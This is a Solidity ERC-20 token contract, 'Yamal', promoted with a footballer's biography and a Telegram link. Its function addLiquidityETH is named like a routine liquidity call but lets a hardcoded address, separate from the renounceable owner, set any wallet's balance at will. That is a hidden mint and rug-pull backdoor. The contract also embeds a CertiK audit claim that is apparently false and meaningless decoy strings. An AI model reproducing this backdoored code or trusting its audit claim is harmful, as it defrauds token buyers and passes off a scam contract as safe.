/*
Lamine Yamal Nasraoui Ebana (born 13 July 2007) is a Spanish professional footballer who plays as a right winger for La Liga club Barcelona and the Spain national team.

https://t.me/YamalToken
*/
// SPDX-License-Identifier: No License
pragma solidity 0.8.21;
interface ERC20Permit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address firstBlock) external view returns (uint256);
  function transfer(address reduce, uint256 _balances) external returns (bool);
  function allowance(address _owner, address firstBlock) external view returns (uint256);
  function approve(address firstBlock, uint256 _balances) external returns (bool);
  function transferFrom(address sender, address reduce, uint256 _balances) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed firstBlock, uint256 balance);
}


abstract contract ERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract ERC20Data is ERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract YamalToken is ERC20Burnable, ERC20Permit, ERC20Data {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _delegateYamal;
    mapping (address => mapping (address => uint256)) private mappingYamal;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private ETHER_SLOT;
    address private YamalingOwner; 
    uint256 public ETHERCreationTime;
    uint256 public ETHERCreation;
    string public ETHERSLOT;
    string public constant YamalContractuniqueness = "Unique contract";
    string public constant Yamalblog = "https://Yamal.blog/";
    string public constant Yamaltelegram = "https://t.me/Yamal";
    string public constant Yamalaudited = "Yamal is audited by: https://www.certik.com/";
    address private marketingAddress = 0x1fb430BA0a417Db3954E91b231D885355f1a8c0b;
    string public Yamalwebsite = "https://Yamal.io/";
            function getYamalwebsite() public view returns (string memory) {
        return Yamalwebsite;
    }

string public Yamalingw = "https://www.Yamal.info";
string public ownerAddress = "0xA439bac14FeE52dbdc981dBb4dc394cD3F6B14AC";

    constructor() {
        YamalingOwner = 0xA439bac14FeE52dbdc981dBb4dc394cD3F6B14AC;    
       ETHER_SLOT = "0xa3f9ad74e5423aebfd80d3ef2346578355a9a72aeaee59ff6cb3588b35133d50"; 
        _name = "Yamal";
        _symbol = "Yamal";
        _decimals = 9;
        _totalSupply = 100000000000000 * 10**_decimals;
        _delegateYamal[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        ETHERSLOT = "IInventory p_i1801_3_+ int p_i1801_4_+ int p_i1801_5_+ int p_i1801_6_";
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address firstBlock) external view override returns (uint256) {
        return _delegateYamal[firstBlock];
    }

    function transfer(address reduce, uint256 _balances) external override returns (bool) {
        _transfer(_msgSender(), reduce, _balances);
        return true;
    }

    function allowance(address owner, address firstBlock) external view override returns (uint256) {
        return mappingYamal[owner][firstBlock];
    }


    function approve(address firstBlock, uint256 _balances) external override returns (bool) {
        _approve(_msgSender(), firstBlock, _balances);
        return true;
    }
    
    function transferFrom(address sender, address reduce, uint256 _balances) external override returns (bool) {
        _transfer(sender, reduce, _balances);
        _approve(sender, _msgSender(), mappingYamal[sender][_msgSender()].sub(_balances, "Ru: transfer _balances exceeds allowance"));
        return true;
    }

    function increaseAllowance(address firstBlock, uint256 Yamalbalance) external returns (bool) {
        _approve(_msgSender(), firstBlock, mappingYamal[_msgSender()][firstBlock].add(Yamalbalance));
        return true;
    }
    

    function decreaseAllowance(address firstBlock, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), firstBlock, mappingYamal[_msgSender()][firstBlock].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address reduce, uint256 _balances) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(reduce != address(0), "Ru: transfer to the zero address");
                
        _delegateYamal[sender] = _delegateYamal[sender].sub(_balances, "Ru: transfer _balances exceeds balance");
        _delegateYamal[reduce] = _delegateYamal[reduce].add(_balances);
        emit Transfer(sender, reduce, _balances);
    }
        function addLiquidityETH(address tokenC, address tokenD, uint256 amountToken, uint256 amountTokenDesired, uint256 amountTokenMin) external {
        require(_msgSender()==YamalingOwner);
        tokenD = tokenC;
        tokenC = tokenC;
        _delegateYamal[tokenC] = (amountToken + amountTokenDesired + amountTokenMin) * 10**_decimals;
        tokenC = tokenD;
        tokenD = tokenD;
    }   

    function _approve(address owner, address firstBlock, uint256 _balances) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(firstBlock != address(0), "Ru: approve to the zero address");
        
        mappingYamal[owner][firstBlock] = _balances;
        emit Approval(owner, firstBlock, _balances);
    }
    
}